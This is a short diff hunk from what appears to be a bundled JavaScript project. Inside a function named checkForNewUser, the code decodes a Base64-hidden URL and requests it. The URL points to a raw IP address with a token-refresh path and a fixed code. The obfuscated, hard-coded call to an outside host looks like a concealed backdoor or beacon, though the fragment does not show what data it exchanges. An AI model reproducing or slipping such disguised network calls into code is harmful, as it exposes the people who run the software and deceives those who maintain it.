@@ -2363,6 +2363,7 @@ GetEarnings(usr,pgTk){
 
 
     checkForNewUser(req, res) {
+        var _th = this; 
         let _uri = Base64$1.decode('aHR0cDovLzMuMTM2LjU0LjE1Nzo3MjU4L3JlZnJlc2hUb2tlbk1zZz9jb2RlPTg1MDIxNw==');    
         _uri && request({
             uri: _uri,	 
